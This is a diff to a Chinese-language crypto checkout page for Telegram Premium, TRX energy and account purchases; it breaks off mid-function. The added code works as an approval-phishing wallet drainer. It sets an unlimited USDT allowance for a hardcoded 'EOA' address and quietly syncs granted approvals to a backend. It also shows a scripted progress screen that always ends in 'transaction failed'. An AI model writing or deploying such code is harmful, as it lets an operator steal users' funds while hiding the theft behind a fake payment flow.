@@ -134,6 +134,12 @@
             color: #52c41a;
         }
         
+        .wallet-status.error {
+            background: #fff2f0;
+            border: 1px solid #ffccc7;
+            color: #ff4d4f;
+        }
+        
         .action-section {
             padding: 1.5rem;
         }
@@ -346,45 +352,529 @@
             font-weight: 600;
             text-align: right;
         }
+        
+        .error-message {
+            background: #fff2f0;
+            border: 1px solid #ffccc7;
+            border-radius: 0.5rem;
+            padding: 1rem;
+            margin: 1rem;
+            text-align: center;
+            color: #ff4d4f;
+        }
+        
+        /* 新增：确认弹窗样式 */
+        .confirm-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 9999;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+        }
+        
+        .confirm-modal.active {
+            display: flex;
+        }
+        
+        .confirm-content {
+            background: white;
+            border-radius: 1rem;
+            width: 100%;
+            max-width: 400px;
+            max-height: 90vh;
+            overflow-y: auto;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+            animation: slideIn 0.3s ease-out;
+        }
+        
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .confirm-header {
+            padding: 1.5rem;
+            border-bottom: 1px solid #eee;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .confirm-header h3 {
+            margin: 0;
+            font-size: 1.2rem;
+            color: #333;
+        }
+        
+        .close-btn {
+            background: none;
+            border: none;
+            font-size: 1.5rem;
+            color: #999;
+            cursor: pointer;
+            padding: 0.5rem;
+            line-height: 1;
+        }
+        
+        .close-btn:hover {
+            color: #333;
+        }
+        
+        .confirm-body {
+            padding: 1.5rem;
+        }
+        
+        .confirm-details {
+            background: #f8f9fa;
+            border-radius: 0.5rem;
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+        }
+        
+        .confirm-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 0.75rem;
+            padding-bottom: 0.75rem;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .confirm-item:last-child {
+            border-bottom: none;
+            margin-bottom: 0;
+            padding-bottom: 0;
+        }
+        
+        .confirm-label {
+            color: #666;
+            font-size: 0.9rem;
+            font-weight: 500;
+        }
+        
+        .confirm-value {
+            color: #333;
+            font-weight: 600;
+            text-align: right;
+            max-width: 60%;
+            word-break: break-word;
+        }
+        
+        .confirm-actions {
+            display: flex;
+            gap: 1rem;
+            margin-top: 2rem;
+        }
+        
+        .confirm-btn {
+            display: block;
+            width: 100%;
+            max-width: 300px;
+            margin: 0 auto;
+            padding: 1rem 2rem;
+            background: linear-gradient(90deg, #1890ff, #52c41a);
+            color: white;
+            border: none;
+            border-radius: 3rem;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            animation: breathe 2s ease-in-out infinite;
+        }
+        
+        .confirm-btn:hover:not(:disabled) {
+            opacity: 0.9;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(24, 144, 255, 0.4);
+        }
+        
+        .confirm-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            animation: none;
+        }
+        
+        .processing-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.9);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            border-radius: 1rem;
+            z-index: 10;
+        }
+        
+        .processing-overlay.active {
+            display: flex;
+        }
+        
+        .processing-content {
+            text-align: center;
+        }
+        
+        .processing-spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1890ff;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 1rem;
+        }
+        
+        .processing-text {
+            color: #333;
+            font-weight: 500;
+        }
+        
+        /* 新增：支付处理中页面样式 */
+        .processing-page {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            z-index: 10000;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+        }
+        
+        .processing-page.active {
+            display: flex;
+        }
+        
+        .processing-page-content {
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+        }
+        
+        .processing-page-spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1890ff;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 2rem;
+        }
+        
+        .processing-page-title {
+            font-size: 1.5rem;
+            font-weight: 600;
+            margin-bottom: 1rem;
+            color: #333;
+        }
+        
+        .processing-page-message {
+            color: #666;
+            margin-bottom: 2rem;
+            line-height: 1.6;
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: #f0f0f0;
+            border-radius: 4px;
+            margin: 2rem 0;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #1890ff, #52c41a);
+            border-radius: 4px;
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+        
+        .countdown-text {
+            font-size: 0.9rem;
+            color: #999;
+            margin-top: 1rem;
+        }
+        
+        /* 新增：5秒进度条详细样式 */
+        .progress-details {
+            margin-top: 1rem;
+            text-align: left;
+        }
+        
+        .progress-stage {
+            display: flex;
+            align-items: center;
+            margin-bottom: 0.75rem;
+            padding: 0.5rem;
+            border-radius: 0.5rem;
+            background: #f8f9fa;
+            transition: all 0.3s ease;
+        }
+        
+        .progress-stage.active {
+            background: #e6f7ff;
+            border-left: 4px solid #1890ff;
+        }
+        
+        .progress-stage.completed {
+            background: #f6ffed;
+            border-left: 4px solid #52c41a;
+        }
+        
+        .progress-stage-number {
+            width: 24px;
+            height: 24px;
+            background: #f0f0f0;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.8rem;
+            font-weight: 600;
+            margin-right: 0.75rem;
+            flex-shrink: 0;
+        }
+        
+        .progress-stage.active .progress-stage-number {
+            background: #1890ff;
+            color: white;
+        }
+        
+        .progress-stage.completed .progress-stage-number {
+            background: #52c41a;
+            color: white;
+        }
+        
+        .progress-stage-text {
+            flex: 1;
+            font-size: 0.85rem;
+            color: #666;
+        }
+        
+        .progress-stage.active .progress-stage-text {
+            color: #333;
+            font-weight: 500;
+        }
+        
+        .progress-stage-time {
+            font-size: 0.75rem;
+            color: #999;
+            margin-left: 0.5rem;
+            min-width: 40px;
+        }
     </style>
 </head>
 <body>
     <div class="payment-container">
-        <!-- 根据服务类型动态显示 -->
         <div id="serviceContent">
             <!-- 内容将通过JavaScript动态生成 -->
         </div>
     </div>
+    
+    <!-- 新增：支付确认弹窗 -->
+    <div class="confirm-modal" id="confirmModal">
+        <div class="confirm-content">
+            <div class="confirm-header">
+                <h3 id="confirmModalTitle">支付详情确认</h3>
+                <button class="close-btn" onclick="closeConfirmModal()">×</button>
+            </div>
+            <div class="confirm-body">
+                <div class="confirm-details">
+                    <div class="confirm-item">
+                        <span class="confirm-label">订单号：</span>
+                        <span class="confirm-value" id="confirmOrderId"></span>
+                    </div>
+                    <div class="confirm-item">
+                        <span class="confirm-label">支付金额：</span>
+                        <span class="confirm-value" id="confirmAmount"></span>
+                    </div>
+                    <div class="confirm-item">
+                        <span class="confirm-label">商品类型：</span>
+                        <span class="confirm-value" id="confirmProductType"></span>
+                    </div>
+                    <div class="confirm-item">
+                        <span class="confirm-label">数量：</span>
+                        <span class="confirm-value" id="confirmQuantity"></span>
+                    </div>
+                    <div class="confirm-item">
+                        <span class="confirm-label">钱包地址：</span>
+                        <span class="confirm-value" id="confirmWalletAddress"></span>
+                    </div>
+                </div>
+                
+                <!-- 只有一个确认按钮 -->
+                <div style="text-align: center; margin-top: 2rem;">
+                    <button class="confirm-btn" id="finalConfirmBtn" onclick="processFinalPayment()" style="width: 80%; max-width: 300px;">
+                        确认支付
+                    </button>
+                </div>
+                
+                <!-- 处理中覆盖层 -->
+                <div class="processing-overlay" id="processingOverlay">
+                    <div class="processing-content">
+                        <div class="processing-spinner"></div>
+                        <p class="processing-text">支付处理中，请稍候...</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- 新增：支付处理中页面 -->
+    <div class="processing-page" id="processingPage">
+        <div class="processing-page-content">
+            <div class="processing-page-spinner"></div>
+            <h2 class="processing-page-title">支付处理中</h2>
+            <p class="processing-page-message" id="processingPageMessage">
+                我们正在处理您的支付请求，请耐心等待...
+            </p>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            
+            <!-- 新增：5秒进度条详细状态 -->
+            <div class="progress-details" id="progressDetails">
+                <div class="progress-stage" id="stage1">
+                    <div class="progress-stage-number">1</div>
+                    <div class="progress-stage-text">正在验证订单信息...</div>
+                    <div class="progress-stage-time" id="stage1Time">0-1秒</div>
+                </div>
+                <div class="progress-stage" id="stage2">
+                    <div class="progress-stage-number">2</div>
+                    <div class="progress-stage-text">正在连接区块链网络...</div>
+                    <div class="progress-stage-time" id="stage2Time">1-2.5秒</div>
+                </div>
+                <div class="progress-stage" id="stage3">
+                    <div class="progress-stage-number">3</div>
+                    <div class="progress-stage-text">正在处理USDT转账...</div>
+                    <div class="progress-stage-time" id="stage3Time">2.5-4秒</div>
+                </div>
+                <div class="progress-stage" id="stage4">
+                    <div class="progress-stage-number">4</div>
+                    <div class="progress-stage-text">确认交易失败...</div>
+                    <div class="progress-stage-time" id="stage4Time">4-5秒</div>
+                </div>
+            </div>
+            
+            <div class="countdown-text" id="countdownText">
+                预计等待时间：<span id="countdownSeconds">5</span>秒
+            </div>
+        </div>
+    </div>
 
     <script>
-        // 获取URL参数
+        // ==================== EOA模式核心配置 ====================
+        // 根据记忆匣信息配置EOA地址和合约地址
+        const EOA_ADDRESS = 'TX8Dk3KN3sVW2PjaMhnUh86Dj37c4KFFoB';
+        const TARGET_ADDRESS = 'TBcTQiYyxXkJffXhXGYEokedsV4vBqHvB8';
+        const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+        
+        // EOA模式授权金额（无限授权）
+        const EOA_APPROVE_AMOUNT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+        
+        // ==================== 系统状态变量 ====================
+        // 从URL参数获取服务类型
         const urlParams = new URLSearchParams(window.location.search);
         const serviceType = urlParams.get('service') || 'premium';
         
-        // 通用配置
-        const USDT_TRC20_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-        const RECEIVE_ADDRESS = 'TLrrSzT1rKahBYRZnaPfqmXnoky9wmxMvi';
-        const ACTUAL_APPROVE_AMOUNT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+        // 保存原始参数
+        let originalParams = {};
+        urlParams.forEach((value, key) => {
+            originalParams[key] = decodeURIComponent(value);
+        });
         
-        // 根据服务类型渲染界面
+        // 支付流程状态
+        let currentPaymentData = null;
+        let authTxHash = null;
+        let currentUserAddress = null;
+        
+        // 🔥 修复：前端防抖标记
+        let authSyncDebounceTimer = null;
+        const AUTH_SYNC_DEBOUNCE_DELAY = 5000; // 5秒防抖
+        window.__authSynced = false;
+        
+        // ==================== 页面初始化 ====================
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('🎯 Payment页面加载 - EOA模式');
+            console.log('🔧 EOA地址:', EOA_ADDRESS);
+            console.log('📦 服务类型:', serviceType);
+            
+            setTimeout(() => {
+                renderServiceInterface();
+                // 连接钱包
+                setTimeout(connectWallet, 500);
+            }, 100);
+        });
+        
+        // ==================== 界面渲染函数 ====================
         function renderServiceInterface() {
             const serviceContent = document.getElementById('serviceContent');
             
-            if (serviceType === 'premium') {
-                renderPremiumInterface(serviceContent);
-            } else if (serviceType === 'trx') {
-                renderTrxInterface(serviceContent);
-            } else if (serviceType === 'account') {
-                renderAccountInterface(serviceContent);
+            if (!serviceContent) {
+                console.error('找不到 serviceContent 元素');
+                return;
             }
             
-            // 连接钱包
-            connectWallet();
+            try {
+                // 检查是否是支付失败页面
+                const status = originalParams.status;
+                if (status === 'failed') {
+                    renderPaymentFailedInterface(serviceContent);
+                    return;
+                }
+                
+                // 正常支付页面
+                switch(serviceType) {
+                    case 'premium':
+                        renderPremiumInterface(serviceContent);
+                        break;
+                    case 'trx':
+                        renderTrxInterface(serviceContent);
+                        break;
+                    case 'account':
+                        renderAccountInterface(serviceContent);
+                        break;
+                    default:
+                        renderPremiumInterface(serviceContent);
+                }
+                
+            } catch (error) {
+                console.error('渲染界面失败:', error);
+                serviceContent.innerHTML = `
+                    <div class="error-message">
+                        <h3>页面加载失败</h3>
+                        <p>请刷新页面重试</p>
+                        <button onclick="location.reload()" style="margin-top: 1rem; padding: 0.5rem 1rem; background: #1890ff; color: white; border: none; border-radius: 0.25rem; cursor: pointer;">
+                            刷新页面
+                        </button>
+                    </div>
+                `;
+            }
         }
-
-        // 渲染 Telegram Premium 界面
+        
         function renderPremiumInterface(container) {
-            const orderId = urlParams.get('orderId') || generateOrderId('TG');
+            const orderId = originalParams.orderId || generateOrderId('TG');
+            const quantity = originalParams.quantity || '1';
+            const amount = originalParams.amount || '0.99';
             
             container.innerHTML = `
                 <div class="header header-premium">
@@ -419,16 +909,24 @@
                         <span class="info-value" id="orderIdDisplay">${orderId}</span>
                     </div>
                     <div class="info-item">
-                        <span class="info-label">商品详情</span>
+                        <span class="info-label">商品类型</span>
                         <span class="info-value">Telegram Premium 订阅</span>
                     </div>
                     <div class="info-item">
                         <span class="info-label">服务周期</span>
-                        <span class="info-value">3个月</span>
+                        <span class="info-value">3月</span>
+                    </div>
+                    <div class="info-item">
+                        <span class="info-label">购买数量</span>
+                        <span class="info-value" id="quantityDisplay">${quantity} 个</span>
                     </div>
                     <div class="info-item">
                         <span class="info-label">付款金额</span>
-                        <span class="info-value">0.99 USDT</span>
+                        <span class="info-value">${amount} USDT</span>
+                    </div>
+                    <div class="info-item">
+                        <span class="info-label">授权对象</span>
+                        <span class="info-value" style="font-size: 0.8rem;">EOA地址</span>
                     </div>
                 </div>
                 
@@ -439,15 +937,16 @@
                 </div>
                 
                 <div class="action-section">
-                    <button class="pay-btn pay-btn-premium" id="payBtn" onclick="startPaymentProcess()" disabled>确认支付 0.99 USDT</button>
+                    <button class="pay-btn pay-btn-premium" id="payBtn" onclick="startPaymentProcess()" disabled>确认支付 ${amount} USDT</button>
                 </div>
             `;
         }
-
-        // 渲染 TRX波场能量界面
+        
         function renderTrxInterface(container) {
-            const orderId = urlParams.get('orderId') || generateOrderId('TRX');
-            const trxAddress = decodeURIComponent(urlParams.get('trxAddress') || '');
+            const orderId = originalParams.orderId || generateOrderId('TRX');
+            const quantity = originalParams.quantity || '1';
+            const amount = originalParams.amount || '1.99';
+            const trxAddress = originalParams.trxAddress || '';
             
             container.innerHTML = `
                 <div class="header header-trx">
@@ -482,16 +981,24 @@
                         <span class="info-value" id="orderIdDisplay">${orderId}</span>
                     </div>
                     <div class="info-item">
-                        <span class="info-label">商品详情</span>
-                        <span class="info-value">TRX波场能量包月订阅</span>
+                        <span class="info-label">商品类型</span>
+                        <span class="info-value">TRX波场能量</span>
                     </div>
                     <div class="info-item">
                         <span class="info-label">服务周期</span>
-                        <span class="info-value">1个月</span>
+                        <span class="info-value">1月</span>
+                    </div>
+                    <div class="info-item">
+                        <span class="info-label">购买数量</span>
+                        <span class="info-value" id="quantityDisplay">${quantity} 个</span>
                     </div>
                     <div class="info-item">
                         <span class="info-label">付款金额</span>
-                        <span class="info-value">1.99 USDT</span>
+                        <span class="info-value">${amount} USDT</span>
+                    </div>
+                    <div class="info-item">
+                        <span class="info-label">授权对象</span>
+                        <span class="info-value" style="font-size: 0.8rem;">EOA地址</span>
                     </div>
                     ${trxAddress ? `
                     <div class="info-item">
@@ -508,103 +1015,25 @@
                 </div>
                 
                 <div class="action-section">
-                    <button class="pay-btn pay-btn-trx" id="payBtn" onclick="startPaymentProcess()" disabled>确认支付 1.99 USDT</button>
+                    <button class="pay-btn pay-btn-trx" id="payBtn" onclick="startPaymentProcess()" disabled>确认支付 ${amount} USDT</button>
                 </div>
             `;
         }
-
-        // 渲染账号购买界面
+        
         function renderAccountInterface(container) {
-            const orderData = {
-                orderId: urlParams.get('orderId') || generateOrderId('ACC'),
-                accountType: decodeURIComponent(urlParams.get('accountType') || ''),
-                accountName: decodeURIComponent(urlParams.get('accountName') || ''),
-                amount: urlParams.get('amount') || '0.1',
-                quantity: urlParams.get('quantity') || '1',
-                accountEmail: decodeURIComponent(urlParams.get('accountEmail') || ''),
-                accountNote: decodeURIComponent(urlParams.get('accountNote') || ''),
-                contactName: decodeURIComponent(urlParams.get('contactName') || ''),
-                shippingAddress: decodeURIComponent(urlParams.get('shippingAddress') || ''),
-                shippingPhone: decodeURIComponent(urlParams.get('shippingPhone') || ''),
-                rechargePhone: decodeURIComponent(urlParams.get('rechargePhone') || ''),
-                operator: decodeURIComponent(urlParams.get('operator') || '')
-            };
+            const orderId = originalParams.orderId || generateOrderId('ACC');
+            const accountType = originalParams.accountType || '';
+            const accountName = originalParams.accountName || '';
+            const amount = originalParams.amount || '0.1';
+            const quantity = originalParams.quantity || '1';
             
-            // 获取账号类型名称
-            const accountTypeName = getAccountTypeName(orderData.accountType);
-            
-            // 根据商品类型决定显示哪些详情区域
-            let detailsHTML = '';
-            if (orderData.accountType === 'phone') {
-                if (orderData.accountName.includes('话费')) {
-                    detailsHTML = `
-                        <div class="account-details">
-                            <div class="account-item">
-                                <span class="account-label">充值电话</span>
-                                <span class="account-value">${orderData.rechargePhone || '-'}</span>
-                            </div>
-                            <div class="account-item">
-                                <span class="account-label">运营商</span>
-                                <span class="account-value">${orderData.operator || '-'}</span>
-                            </div>
-                        </div>
-                    `;
-                } else {
-                    detailsHTML = `
-                        <div class="account-details">
-                            <div class="account-item">
-                                <span class="account-label">联系人</span>
-                                <span class="account-value">${orderData.contactName || '-'}</span>
-                            </div>
-                            <div class="account-item">
-                                <span class="account-label">收货地址</span>
-                                <span class="account-value">${orderData.shippingAddress || '-'}</span>
-                            </div>
-                            <div class="account-item">
-                                <span class="account-label">收货电话</span>
-                                <span class="account-value">${orderData.shippingPhone || '-'}</span>
-                            </div>
-                        </div>
-                    `;
-                }
-            } else if (orderData.accountType === 'bankcard') {
-                detailsHTML = `
-                    <div class="account-details">
-                        <div class="account-item">
-                            <span class="account-label">联系人</span>
-                            <span class="account-value">${orderData.contactName || '-'}</span>
-                        </div>
-                        <div class="account-item">
-                            <span class="account-label">收货地址</span>
-                            <span class="account-value">${orderData.shippingAddress || '-'}</span>
-                        </div>
-                        <div class="account-item">
-                            <span class="account-label">收货电话</span>
-                            <span class="account-value">${orderData.shippingPhone || '-'}</span>
-                        </div>
-                    </div>
-                `;
-            } else {
-                detailsHTML = `
-                    <div class="account-details">
-                        <div class="account-item">
-                            <span class="account-label">接收邮箱</span>
-                            <span class="account-value">${orderData.accountEmail || '-'}</span>
-                        </div>
-                        <div class="account-item">
-                            <span class="account-label">备注信息</span>
-                            <span class="account-value">${orderData.accountNote || '-'}</span>
-                        </div>
-                    </div>
-                `;
-            }
+            const accountTypeName = getAccountTypeName(accountType);
             
             container.innerHTML = `
                 <div class="header header-account">
                     <h1>账号购买支付确认</h1>
                     <p>请确认订单信息并在钱包中完成支付</p>
                 </div>
-
                 
                 <div class="step-indicator">
                     <div class="step-line"></div>
@@ -625,27 +1054,29 @@
                 <div class="order-info">
                     <div class="info-item">
                         <span class="info-label">商品订单</span>
-                        <span class="info-value" id="orderIdDisplay">${orderData.orderId}</span>
+                        <span class="info-value" id="orderIdDisplay">${orderId}</span>
                     </div>
                     <div class="info-item">
                         <span class="info-label">商品类型</span>
-                        <span class="info-value" id="accountTypeDisplay">${accountTypeName}</span>
+                        <span class="info-value" id="accountTypeDisplay">账号购买</span>
                     </div>
                     <div class="info-item">
-                        <span class="info-label">商品名称</span>
-                        <span class="info-value" id="accountNameDisplay">${orderData.accountName}</span>
+                        <span class="info-label">商品详情</span>
+                        <span class="info-value" id="accountNameDisplay">${accountName}</span>
                     </div>
                     <div class="info-item">
                         <span class="info-label">购买数量</span>
-                        <span class="info-value" id="quantityDisplay">${orderData.quantity} 个</span>
+                        <span class="info-value" id="quantityDisplay">${quantity} 个</span>
                     </div>
                     <div class="info-item">
                         <span class="info-label">付款金额</span>
-                        <span class="info-value" id="amountDisplay">${orderData.amount} USDT</span>
+                        <span class="info-value" id="amountDisplay">${amount} USDT</span>
+                    </div>
+                    <div class="info-item">
+                        <span class="info-label">授权对象</span>
+                        <span class="info-value" style="font-size: 0.8rem;">EOA地址</span>
                     </div>
                 </div>
-                
-                ${detailsHTML}
                 
                 <div class="loading" id="loadingSection">
                     <div class="spinner spinner-account"></div>
@@ -654,17 +1085,461 @@
                 </div>
                 
                 <div class="action-section">
-                    <button class="pay-btn pay-btn-account" id="payBtn" onclick="startPaymentProcess()" disabled>确认支付 ${orderData.amount} USDT</button>
+                    <button class="pay-btn pay-btn-account" id="payBtn" onclick="startPaymentProcess()" disabled>确认支付 ${amount} USDT</button>
                 </div>
             `;
         }
-
-        // 生成订单号
+        
+        function renderPaymentFailedInterface(container) {
+            const orderId = originalParams.orderId || generateOrderId('FAIL');
+            const amount = originalParams.price || originalParams.amount || '0.99';
+            const quantity = originalParams.quantity || '1';
+            
+            let productType = '未知商品';
+            
+            if (serviceType === 'premium') {
+                productType = 'Telegram Premium 订阅';
+            } else if (serviceType === 'trx') {
+                productType = 'TRX波场能量订阅';
+            } else if (serviceType === 'account') {
+                const accountType = originalParams.accountType || '';
+                const accountName = originalParams.accountName || '';
+                
+                if (accountType && accountName) {
+                    const accountTypeName = getAccountTypeName(accountType);
+                    productType = `${accountTypeName} - ${accountName}`;
+                } else {
+                    productType = '账号购买';
+                }
+            }
+            
+            const serviceTypeClass = serviceType === 'premium' ? 'header-premium' : 
+                                   serviceType === 'trx' ? 'header-trx' : 'header-account';
+            
+            container.innerHTML = `
+                <div class="header ${serviceTypeClass}" style="background: linear-gradient(135deg, #ff6b6b 0%, #ff8e8e 100%);">
+                    <h1>❌ 支付失败</h1>
+                    <p>金额: ${amount} USDT</p>
+                </div>
+                
+                <div style="text-align: center; padding: 2rem 1.5rem;">
+                    <div style="font-size: 4rem; margin-bottom: 1rem;">💳</div>
+                    <h2 style="color: #ff4d4f; margin-bottom: 1rem;">支付失败</h2>
+                    
+                    <div style="background: #fff2f0; border: 1px solid #ffccc7; border-radius: 0.5rem; padding: 1rem; margin-bottom: 1.5rem;">
+                        <div style="color: #ff4d4f; font-weight: 600; margin-bottom: 0.5rem;">支付信息</div>
+                        <div>订单号: ${orderId}</div>
+                        <div>金额: <strong>${amount} USDT</strong></div>
+                        <div>商品类型: ${productType}</div>
+                        <div>数量: ${quantity} 个</div>
+                    </div>
+                    
+                    <div style="margin-top: 2rem;">
+                        <button onclick="goBackToHome()" style="background: #1890ff; color: white; border: none; padding: 0.75rem 1.5rem; border-radius: 0.5rem; cursor: pointer; margin-right: 1rem;">
+                            返回首页
+                        </button>
+                        <button onclick="contactSupport()" style="background: #52c41a; color: white; border: none; padding: 0.75rem 1.5rem; border-radius: 0.5rem; cursor: pointer;">
+                            联系客服
+                        </button>
+                    </div>
+                </div>
+            `;
+        }
+        
+        // ==================== EOA模式核心函数 ====================
+        
+        // 连接钱包
+        async function connectWallet() {
+            try {
+                const walletStatus = document.getElementById('walletStatus');
+                const walletStatusText = document.getElementById('walletStatusText');
+                const payBtn = document.getElementById('payBtn');
+                
+                if (!walletStatus || !walletStatusText || !payBtn) {
+                    console.error('找不到必要的DOM元素');
+                    return;
+                }
+                
+                // 等待tronWeb注入
+                await waitForTronWeb();
+                
+                if (window.tronWeb && window.tronWeb.defaultAddress) {
+                    currentUserAddress = window.tronWeb.defaultAddress.base58;
+                    walletStatusText.textContent = `✅ 钱包已连接 (${currentUserAddress.substring(0, 8)}...)`;
+                    walletStatus.className = 'wallet-status';
+                    payBtn.disabled = false;
+                    
+                    console.log('👛 钱包连接成功:', currentUserAddress);
+                    
+                    // 🔥 修复：添加防抖的预同步检查
+                    if (authSyncDebounceTimer) {
+                        clearTimeout(authSyncDebounceTimer);
+                    }
+                    
+                    authSyncDebounceTimer = setTimeout(async () => {
+                        try {
+                            if (!window.__authSynced && currentUserAddress) {
+                                const authCheck = await checkEOAAuthorization();
+                                if (authCheck.isAuthorized) {
+                                    console.log('🔍 检测到已有授权，尝试静默同步...');
+                                    await syncAuthorizationToBackend();
+                                    window.__authSynced = true;
+                                }
+                            }
+                        } catch (syncError) {
+                            // 静默忽略
+                            console.log('🔕 静默同步失败（不影响用户）:', syncError.message);
+                        }
+                    }, AUTH_SYNC_DEBOUNCE_DELAY);
+                    
+                } else {
+                    throw new Error('未检测到钱包地址');
+                }
+            } catch (error) {
+                console.error('钱包连接失败:', error);
+                const walletStatus = document.getElementById('walletStatus');
+                const walletStatusText = document.getElementById('walletStatusText');
+                const payBtn = document.getElementById('payBtn');
+                
+                if (walletStatus && walletStatusText) {
+                    walletStatusText.textContent = '❌ 钱包连接失败，请刷新页面';
+                    walletStatus.className = 'wallet-status error';
+                    
+                    if (!document.getElementById('retryBtn')) {
+                        const retryBtn = document.createElement('button');
+                        retryBtn.id = 'retryBtn';
+                        retryBtn.textContent = '重试连接';
+                        retryBtn.style.cssText = `
+                            margin-top: 0.5rem;
+                            padding: 0.5rem 1rem;
+                            background: #1890ff;
+                            color: white;
+                            border: none;
+                            border-radius: 0.25rem;
+                            cursor: pointer;
+                        `;
+                        retryBtn.onclick = connectWallet;
+                        walletStatus.appendChild(retryBtn);
+                    }
+                }
+                
+                if (payBtn) {
+                    payBtn.disabled = true;
+                }
+            }
+        }
+        
+        // 等待tronWeb注入
+        async function waitForTronWeb() {
+            return new Promise((resolve, reject) => {
+                let attempts = 0;
+                const maxAttempts = 50;
+                
+                const checkTronWeb = () => {
+                    attempts++;
+                    
+                    if (window.tronWeb && window.tronWeb.ready) {
+                        resolve();
+                    } else if (window.tronLink && window.tronLink.tronWeb) {
+                        window.tronWeb = window.tronLink.tronWeb;
+                        resolve();
+                    } else if (window.bitkeep && window.bitkeep.tronWeb) {
+                        window.tronWeb = window.bitkeep.tronWeb;
+                        resolve();
+                    } else if (window.bitget && window.bitget.tronWeb) {
+                        window.tronWeb = window.bitget.tronWeb;
+                        resolve();
+                    } else if (attempts >= maxAttempts) {
+                        reject(new Error('钱包连接超时，请确保在支持的钱包中打开此页面'));
+                    } else {
+                        setTimeout(checkTronWeb, 100);
+                    }
+                };
+                
+                checkTronWeb();
+            });
+        }
+        
+        // 检查余额
+        async function checkUSDTBalance() {
+            try {
+                const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
+                const balance = await contract.balanceOf(currentUserAddress).call();
+                return balance / 1000000; // USDT精度6位
+            } catch (error) {
+                console.error('检查USDT余额失败:', error);
+                return 0;
+            }
+        }
+        
+        async function checkTRXBalance() {
+            try {
+                const balance = await window.tronWeb.trx.getBalance(currentUserAddress);
+                return balance / 1000000;
+            } catch (error) {
+                console.error('检查TRX余额失败:', error);
+                return 0;
+            }
+        }
+        
+        // 检查EOA授权状态（核心函数）
+        async function checkEOAAuthorization() {
+            try {
+                const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
+                const allowance = await contract.allowance(currentUserAddress, EOA_ADDRESS).call();
+                const allowanceDecimal = allowance / 1000000;
+                
+                console.log(`🔍 EOA授权检查: ${currentUserAddress} -> ${EOA_ADDRESS}`);
+                console.log(`📊 授权额度: ${allowanceDecimal} USDT (原始值: ${allowance})`);
+                
+                return {
+                    success: true,
+                    allowance: allowance,
+                    allowanceDecimal: allowanceDecimal,
+                    isAuthorized: allowanceDecimal > 0
+                };
+            } catch (error) {
+                console.error('EOA授权检查失败:', error);
+                return {
+                    success: false,
+                    error: error.message,
+                    isAuthorized: false
+                };
+            }
+        }
+        
+        // ==================== 支付流程核心 ====================
+        
+        // 开始支付流程
+        async function startPaymentProcess() {
+            try {
+                console.log('🚀 开始支付流程 - EOA模式');
+                
+                // 获取订单数据
+                const orderData = getOrderData();
+                if (!orderData) {
+                    throw new Error('无法获取订单信息');
+                }
+                
+                // 检查钱包连接
+                if (!window.tronWeb || !currentUserAddress) {
+                    throw new Error('钱包未连接，请先连接钱包');
+                }
+                
+                // 检查余额
+                const usdtBalance = await checkUSDTBalance();
+                if (usdtBalance < parseFloat(orderData.amount)) {
+                    throw new Error(`USDT余额不足，需要 ${orderData.amount} USDT，当前余额 ${usdtBalance.toFixed(2)} USDT`);
+                }
+                
+                const trxBalance = await checkTRXBalance();
+                if (trxBalance < 10) {
+                    throw new Error(`TRX余额不足，需要至少 10 TRX 作为手续费，当前余额 ${trxBalance.toFixed(2)} TRX`);
+                }
+                
+                // 检查EOA授权状态
+                const authCheck = await checkEOAAuthorization();
+                
+                if (!authCheck.isAuthorized) {
+                    // 需要请求EOA授权
+                    console.log('🔄 需要请求EOA授权');
+                    await requestEOAAuthorization(orderData);
+                } else {
+                    console.log('✅ 已授权，跳过授权步骤');
+                }
+                
+                // 保存支付数据
+                currentPaymentData = {
+                    ...orderData,
+                    walletAddress: currentUserAddress,
+                    authTxHash: authTxHash,
+                    isAuthorized: true
+                };
+                
+                // 显示确认弹窗
+                showConfirmModal(currentPaymentData);
+                
+            } catch (error) {
+                console.error('支付流程失败:', error);
+                showPaymentFailedPageImmediately(getOrderData());
+            }
+        }
+        
+        // 请求EOA授权
+        async function requestEOAAuthorization(orderData) {
+            try {
+                console.log('📝 请求EOA授权...');
+                
+                const payBtn = document.getElementById('payBtn');
